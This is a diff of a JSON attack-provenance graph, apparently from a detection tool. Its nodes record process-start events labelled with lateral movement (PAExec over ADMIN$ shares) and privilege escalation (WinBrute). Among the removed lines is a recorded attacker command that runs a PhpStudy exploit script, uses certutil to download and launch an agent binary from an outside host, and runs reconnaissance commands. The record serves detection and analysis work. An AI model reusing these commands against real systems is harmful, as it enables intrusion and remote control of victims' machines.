-            "id": "fcfc065f34be653d80aaa6230a21af13",
-            "score": "0",
-            "type": "command"
-        },
-        {
-            "label": "C:/Windows/system32/cmd.exe   /c  python PhpStudyExp2.py http://121.36.30.176/  taskkill /f /im agent.exe&amp;certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:/Users/Public/agent.exe&amp;cmd /c start /min C:/Users/Public/agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
-            "stage": "null",
-            "raw_cmd": "cmd",
-            "id": "caf4d3e9fc825024591331fbda3e035d",
-            "score": "0",
-            "type": "command"
-        },
-        {
-            "label": "",
+            "description": "null",
+            "label": "PAExec",
             "stage": "Move Laterally",
             "raw_cmd": "PAExec",
             "id": "4d8ecc01537a5fd45f02cefd2b57c84e",
             "score": "50.599999999999994",
-            "type": "command"
+            "type": "command",
+            "ip": [
+                "192.168.0.95:50766->192.168.0.244:135",
+                "192.168.0.95:50767->192.168.0.244:49163"
+            ],
+            "filename": [
+                "  C:/Users/Public/PAExec.exe\\\"\"",
+                "  //192.168.0.244/pipe/PAExecOutWIN2012-14224\\\"\"",
+                "  //192.168.0.244/ADMIN$/PAExec-4224-WIN2012-1.exe\\\"\"",
+                "  //192.168.0.244/pipe/PAExecErrWIN2012-14224\\\"\"",
+                "  //192.168.0.244/pipe/PAExec-4224-WIN2012-1.exe\\\"\""
+            ]
         },
         {
+            "description": "null",
             "label": "WinBrute.exe  administrator_pass.txt administrator",
             "stage": "Escalate Privilege",
             "raw_cmd": "WinBrute",
             "id": "6082b551cbe7e35fcb30bc6a9d81a48e",
             "score": "8.2",
-            "type": "command"
+            "type": "command",
+            "ip": [],
+            "filename": [
+                "  C:/Users/Public/administrator_pass.txt\\\"\"",
+                "  C:/Users/Public/WinBrute.exe\\\"\""
+            ]
         },
         {
-            "label": "C:/Windows/system32/cmd.exe   /c  python PhpStudyExp2.py http://121.36.30.176/  whoami&amp;arp -a&amp;ipconfig&amp;ping www.baidu.com -c 1",
-            "stage": "null",
-            "raw_cmd": "cmd",
-            "id": "d9e6eb83c05eca89983adf15a60c922d",
-            "score": "0",
-            "type": "command"
-        },
-        {
-            "label": "",
+            "description": "null",
+            "label": "PAExec",
             "stage": "Move Laterally",
             "raw_cmd": "PAExec",
             "id": "7edf352f9fb1500fc7ad04c4e05ec912",
             "score": "50.599999999999994",
-            "type": "command"
+            "type": "command",
+            "ip": [
+                "192.168.0.95:50764->192.168.0.95:135",
+                "192.168.0.95:50765->192.168.0.95:49160"
+            ],
+            "filename": [
+                "  C:/Users/Public/PAExec.exe\\\"\"",
+                "  //192.168.0.95/ADMIN$/PAExec-2196-WIN2012-1.exe\\\"\"",
+                "  //192.168.0.95/pipe/PAExec-2196-WIN2012-1.exe\\\"\"",
+                "  //192.168.0.95/pipe/PAExecErrWIN2012-12196\\\"\"",
+                "  //192.168.0.95/pipe/PAExecOutWIN2012-12196\\\"\""
+            ]
         }
     ],
     "connects": [],
     "files": [],
     "edges": [
         {
-            "source": "7acd487c31c9e4d993187f2c59784e6a",
-            "target": "8d40d4461bb8935b0e783328148798d2",
-            "time": "1970-01-02 13:49:16",
+            "source": "f237e928b509fb6da44887c695c5790d",
+            "target": "7acd487c31c9e4d993187f2c59784e6a",
+            "time": "2022-03-26 21:05:19",
             "syscall": "process start",
             "id": "0"
         },
         {
-            "source": "7acd487c31c9e4d993187f2c59784e6a",
-            "target": "ab389e7fcd9b6064e0fcfdd0bea3e93f",
-            "time": "1970-01-02 13:49:10",
+            "source": "f237e928b509fb6da44887c695c5790d",
+            "target": "0e82ab1459acc722c0bc228d9de98ee1",
+            "time": "2022-03-26 23:59:41",
             "syscall": "process start",
             "id": "1"
         },
         {
             "source": "f237e928b509fb6da44887c695c5790d",
-            "target": "7acd487c31c9e4d993187f2c59784e6a",
-            "time": "1970-01-02 13:49:08",
+            "target": "f4106fd012d36c419884c078bfa0d7d8",
+            "time": "2022-03-27 02:47:05",
             "syscall": "process start",
             "id": "2"
         },
         {
-            "source": "f237e928b509fb6da44887c695c5790d",
-            "target": "0e82ab1459acc722c0bc228d9de98ee1",
-            "time": "1970-01-02 16:43:30",
+            "source": "f4106fd012d36c419884c078bfa0d7d8",
+            "target": "0e881c511f479048c410c13ed48be35d",
+            "time": "2022-03-27 07:14:21",
             "syscall": "process start",
             "id": "3"
         },
         {
-            "source": "f237e928b509fb6da44887c695c5790d",
-            "target": "f4106fd012d36c419884c078bfa0d7d8",
-            "time": "1970-01-02 19:30:54",
+            "source": "f4106fd012d36c419884c078bfa0d7d8",
+            "target": "77d192d3aa3b53fa32ca4e97fa20733d",
+            "time": "2022-03-27 02:48:10",
             "syscall": "process start",
             "id": "4"
         },
         {
-            "source": "0e82ab1459acc722c0bc228d9de98ee1",
-            "target": "8d5876fd1d2342bd981143797153f006",
-            "time": "1970-01-02 16:43:46",
+            "source": "f4106fd012d36c419884c078bfa0d7d8",
+            "target": "ba0c5316e6fa54216acc9110ce3fc5d8",
+            "time": "2022-03-27 02:47:13",
             "syscall": "process start",
             "id": "5"
         },
         {
-            "source": "0e82ab1459acc722c0bc228d9de98ee1",
-            "target": "b0e496fea9037828f95de4e56475af09",
-            "time": "1970-01-02 16:43:32",
+            "source": "f4106fd012d36c419884c078bfa0d7d8",
+            "target": "ff5668a1817970682211c4f6a6185960",
+            "time": "2022-03-27 02:47:07",
             "syscall": "process start",
             "id": "6"
         },
         {
-            "source": "0e82ab1459acc722c0bc228d9de98ee1",
-            "target": "daecd374f068945e34be31e6b7de1a9d",
-            "time": "1970-01-02 16:43:58",
+            "source": "0e881c511f479048c410c13ed48be35d",
+            "target": "c88f5ef37edb18c47c1d5d0093d5f886",
+            "time": "2022-03-27 07:14:37",
             "syscall": "process start",
             "id": "7"
         },
         {
-            "source": "0e82ab1459acc722c0bc228d9de98ee1",
-            "target": "df3823b768e608b4ad4efdd1a2162380",
-            "time": "1970-01-02 16:44:05",
+            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
+            "target": "04123a0c0bbbc0b2ded650454ed22d10",
+            "time": "2022-03-27 21:14:54",
             "syscall": "process start",
             "id": "8"
         },
         {
-            "source": "0e82ab1459acc722c0bc228d9de98ee1",
-            "target": "ed943872fded9d22497946e84a54b48c",
-            "time": "1970-01-02 16:43:38",
+            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
+            "target": "1ab9d0e544961427073a276ee608b822",
+            "time": "2022-03-28 00:08:36",
             "syscall": "process start",
             "id": "9"
         },
         {
-            "source": "f4106fd012d36c419884c078bfa0d7d8",
-            "target": "0e881c511f479048c410c13ed48be35d",
-            "time": "1970-01-02 23:58:11",
+            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
+            "target": "1bbe83746c4dc7bd98a5b1898d4e97a6",
+            "time": "2022-03-27 21:18:19",
             "syscall": "process start",
             "id": "10"
         },
         {
-            "source": "f4106fd012d36c419884c078bfa0d7d8",
-            "target": "77d192d3aa3b53fa32ca4e97fa20733d",
-            "time": "1970-01-02 19:31:59",
+            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
+            "target": "224ed451937e268f150946b3ae48c27d",
+            "time": "2022-03-27 15:35:24",
             "syscall": "process start",
             "id": "11"
         },
         {
-            "source": "f4106fd012d36c419884c078bfa0d7d8",
-            "target": "ba0c5316e6fa54216acc9110ce3fc5d8",
-            "time": "1970-01-02 19:31:02",
+            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
+            "target": "37694d348df6bcce6491d529922d2f52",
+            "time": "2022-03-27 12:42:49",
             "syscall": "process start",
             "id": "12"
         },
         {
-            "source": "f4106fd012d36c419884c078bfa0d7d8",
-            "target": "ff5668a1817970682211c4f6a6185960",
-            "time": "1970-01-02 19:30:56",
+            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
+            "target": "3ba7410a631d244ac45b4971d30e57da",
+            "time": "2022-03-28 05:52:29",
             "syscall": "process start",
             "id": "13"
         },
         {
-            "source": "0e881c511f479048c410c13ed48be35d",
-            "target": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "time": "1970-01-02 23:58:26",
+            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
+            "target": "5fb8c454b74cd087c9173797e2a28fe8",
+            "time": "2022-03-27 21:20:57",
             "syscall": "process start",
             "id": "14"
         },
         {
             "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "04123a0c0bbbc0b2ded650454ed22d10",
-            "time": "1970-01-03 13:58:43",
+            "target": "6b94ac37e23ec99f6f0b42ec80ba5292",
+            "time": "2022-03-27 12:51:02",
             "syscall": "process start",
             "id": "15"
         },
         {
             "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "0f8a0169d64fc33f1fe3e36a55191779",
-            "time": "1970-01-03 02:38:46",
+            "target": "79e647173fa9f90a3d1824085ed54209",
+            "time": "2022-03-27 15:30:50",
             "syscall": "process start",
             "id": "16"
         },
         {
             "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "19e5ea525891815fa367089bbc2d8c03",
-            "time": "1970-01-03 02:38:37",
+            "target": "9aee6c9fc4f7c217da01b791e7079abb",
+            "time": "2022-03-27 18:34:55",
             "syscall": "process start",
             "id": "17"
         },
         {
             "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "1ab9d0e544961427073a276ee608b822",
-            "time": "1970-01-03 16:52:26",
+            "target": "a5c0daa1992383a1b51018d3a0731f46",
+            "time": "2022-03-27 21:11:29",
             "syscall": "process start",
             "id": "18"
         },
         {
             "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "1bbe83746c4dc7bd98a5b1898d4e97a6",
-            "time": "1970-01-03 14:02:08",
+            "target": "c21e17ba94c56d084eca6701a20c1aed",
+            "time": "2022-03-27 12:48:23",
             "syscall": "process start",
             "id": "19"
         },
         {
             "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "224ed451937e268f150946b3ae48c27d",
-            "time": "1970-01-03 08:19:13",
+            "target": "e30a6deee197fdac89189022341f49c7",
+            "time": "2022-03-28 03:01:00",
             "syscall": "process start",
             "id": "20"
         },
         {
             "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "2747d3b948ba7b25711cfa8ece998ff5",
-            "time": "1970-01-03 11:35:49",
+            "target": "f5c0147f949c803297be02b4a0ae98f2",
+            "time": "2022-03-27 15:37:59",
             "syscall": "process start",
             "id": "21"
         },
         {
-            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "34adc0f4600038b5490d2173d0d2e0b1",
-            "time": "1970-01-03 02:38:27",
+            "source": "1ab9d0e544961427073a276ee608b822",
+            "target": "53b7fcdc4bd446a42e1f7b68b0a70626",
+            "time": "2022-03-28 00:08:44",
             "syscall": "process start",
             "id": "22"
         },
         {
-            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "37694d348df6bcce6491d529922d2f52",
-            "time": "1970-01-03 05:26:38",
+            "source": "3ba7410a631d244ac45b4971d30e57da",
+            "target": "4d8ecc01537a5fd45f02cefd2b57c84e",
+            "time": "2022-03-28 05:52:36",
             "syscall": "process start",
             "id": "23"
         },
         {
-            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "3ba7410a631d244ac45b4971d30e57da",
-            "time": "1970-01-03 22:36:19",
+            "source": "9aee6c9fc4f7c217da01b791e7079abb",
+            "target": "6082b551cbe7e35fcb30bc6a9d81a48e",
+            "time": "2022-03-27 18:35:00",
             "syscall": "process start",
             "id": "24"
         },
         {
-            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "493e9ce98c7ab0a0a699abe7106d09b0",
-            "time": "1970-01-03 02:37:08",
-            "syscall": "process start",
-            "id": "25"
-        },
-        {
-            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "5fb8c454b74cd087c9173797e2a28fe8",
-            "time": "1970-01-03 14:04:46",
-            "syscall": "process start",
-            "id": "26"
-        },
-        {
-            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "65b6784bf0b757d8dda52d2b7c38db9e",
-            "time": "1970-01-03 16:50:35",
-            "syscall": "process start",
-            "id": "27"
-        },
-        {
-            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "6b94ac37e23ec99f6f0b42ec80ba5292",
-            "time": "1970-01-03 05:34:51",
-            "syscall": "process start",
-            "id": "28"
-        },
-        {
-            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "72a13f545e5dfb5835365609045201a0",
-            "time": "1970-01-03 05:34:41",
-            "syscall": "process start",
-            "id": "29"
-        },
-        {
-            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "79e647173fa9f90a3d1824085ed54209",
-            "time": "1970-01-03 08:14:39",
-            "syscall": "process start",
-            "id": "30"
-        },
-        {
-            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "7d93ed06ebe62165a53946755b296419",
-            "time": "1970-01-02 23:58:28",
-            "syscall": "process start",
-            "id": "31"
-        },
-        {
-            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "7fae21d89b5e159cb4fb979bae23e5f7",
-            "time": "1970-01-03 18:32:35",
-            "syscall": "process start",
-            "id": "32"
-        },
-        {
-            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "84d0532fea30425eefa218baae1e0e8c",
-            "time": "1970-01-04 00:58:52",
-            "syscall": "process start",
-            "id": "33"
-        },
-        {
-            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "9aee6c9fc4f7c217da01b791e7079abb",
-            "time": "1970-01-03 11:18:44",
-            "syscall": "process start",
-            "id": "34"
-        },
-        {
-            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "9cd2d35432282fabcf51c2d73e21ed8b",
-            "time": "1970-01-03 11:03:59",
-            "syscall": "process start",
-            "id": "35"
-        },
-        {
-            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "a5c0daa1992383a1b51018d3a0731f46",
-            "time": "1970-01-03 13:55:18",
-            "syscall": "process start",
-            "id": "36"
-        },
-        {
-            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "b3f928c1b1e9d5436163d15dea380b93",
-            "time": "1970-01-03 19:40:27",
-            "syscall": "process start",
-            "id": "37"
-        },
-        {
-            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "b852f346dcf6e1285810808d7a3428bd",
-            "time": "1970-01-03 22:07:38",
-            "syscall": "process start",
-            "id": "38"
-        },
-        {
-            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "bb0628124210cb446ee755aa3ecb71ff",
-            "time": "1970-01-03 22:07:29",
-            "syscall": "process start",
-            "id": "39"
-        },
-        {
-            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "c21e17ba94c56d084eca6701a20c1aed",
-            "time": "1970-01-03 05:32:12",
-            "syscall": "process start",
-            "id": "40"
-        },
-        {
-            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "cdb69fb50fe0c7151e97fed988136f74",
-            "time": "1970-01-04 00:59:02",
-            "syscall": "process start",
-            "id": "41"
-        },
-        {
-            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "d7b56b6fd0eb9b1d4dc62ef6993fdaf1",
-            "time": "1970-01-03 18:32:43",
-            "syscall": "process start",
-            "id": "42"
-        },
-        {
-            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "e30a6deee197fdac89189022341f49c7",
-            "time": "1970-01-03 19:44:49",
-            "syscall": "process start",
-            "id": "43"
-        },
-        {
-            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "e8874be025529d42da8b5a5a189178fa",
-            "time": "1970-01-03 11:35:57",
-            "syscall": "process start",
-            "id": "44"
-        },
-        {
-            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "ef5796fb4e863cfdae647ff52b1cdd5e",
-            "time": "1970-01-03 08:21:39",
-            "syscall": "process start",
-            "id": "45"
-        },
-        {
-            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "f2f1cb87733bc78e068183316fe3ee21",
-            "time": "1970-01-03 22:31:04",
-            "syscall": "process start",
-            "id": "46"
-        },
-        {
-            "source": "c88f5ef37edb18c47c1d5d0093d5f886",
-            "target": "f5c0147f949c803297be02b4a0ae98f2",
-            "time": "1970-01-03 08:21:49",
-            "syscall": "process start",
-            "id": "47"
-        },
-        {
-            "source": "04123a0c0bbbc0b2ded650454ed22d10",
-            "target": "418af2182596f7b2499803e884692c11",
-            "time": "1970-01-03 14:01:44",
-            "syscall": "process start",
-            "id": "48"
-        },
-        {
-            "source": "04123a0c0bbbc0b2ded650454ed22d10",
-            "target": "49e0b760ea287f477dacaf3c04ebb258",
-            "time": "1970-01-03 14:01:31",
-            "syscall": "process start",
-            "id": "49"
-        },
-        {
-            "source": "04123a0c0bbbc0b2ded650454ed22d10",
-            "target": "76ae200b0a1a73aecf7a293da7f3552c",
-            "time": "1970-01-03 14:00:57",
-            "syscall": "process start",
-            "id": "50"
-        },
-        {
-            "source": "04123a0c0bbbc0b2ded650454ed22d10",
-            "target": "a6fc5bd669ef2dd46773e348aaa823de",
-            "time": "1970-01-03 14:01:40",
-            "syscall": "process start",
-            "id": "51"
-        },
-        {
-            "source": "04123a0c0bbbc0b2ded650454ed22d10",
-            "target": "d37af5adfaa024e539b83e30191fcdec",
-            "time": "1970-01-03 14:01:02",
-            "syscall": "process start",
-            "id": "52"
-        },
-        {
-            "source": "1ab9d0e544961427073a276ee608b822",
-            "target": "53b7fcdc4bd446a42e1f7b68b0a70626",
-            "time": "1970-01-03 16:52:33",
-            "syscall": "process start",
-            "id": "53"
-        },
-        {
-            "source": "1bbe83746c4dc7bd98a5b1898d4e97a6",
-            "target": "2d4de7fc672e75dcafc44eddc3ba0ea8",
-            "time": "1970-01-03 14:04:17",
-            "syscall": "process start",
-            "id": "54"
-        },
-        {
-            "source": "1bbe83746c4dc7bd98a5b1898d4e97a6",
-            "target": "fcfc065f34be653d80aaa6230a21af13",
-            "time": "1970-01-03 14:04:22",
-            "syscall": "process start",
-            "id": "55"
-        },
-        {
-            "source": "224ed451937e268f150946b3ae48c27d",
-            "target": "caf4d3e9fc825024591331fbda3e035d",
-            "time": "1970-01-03 08:21:21",
-            "syscall": "process start",
-            "id": "56"
-        },
-        {
-            "source": "3ba7410a631d244ac45b4971d30e57da",
-            "target": "4d8ecc01537a5fd45f02cefd2b57c84e",
-            "time": "1970-01-03 22:36:25",
-            "syscall": "process start",
-            "id": "57"
-        },
-        {
-            "source": "9aee6c9fc4f7c217da01b791e7079abb",
-            "target": "6082b551cbe7e35fcb30bc6a9d81a48e",
-            "time": "1970-01-03 11:18:49",
-            "syscall": "process start",
-            "id": "58"
-        },
-        {
-            "source": "c21e17ba94c56d084eca6701a20c1aed",
-            "target": "d9e6eb83c05eca89983adf15a60c922d",
-            "time": "1970-01-03 05:34:23",
-            "syscall": "process start",
-            "id": "59"
-        },
-        {
             "source": "e30a6deee197fdac89189022341f49c7",
             "target": "7edf352f9fb1500fc7ad04c4e05ec912",
-            "time": "1970-01-03 19:44:54",
+            "time": "2022-03-28 03:01:05",
             "syscall": "process start",
-            "id": "60"
+            "id": "25"
         }
     ]
 }
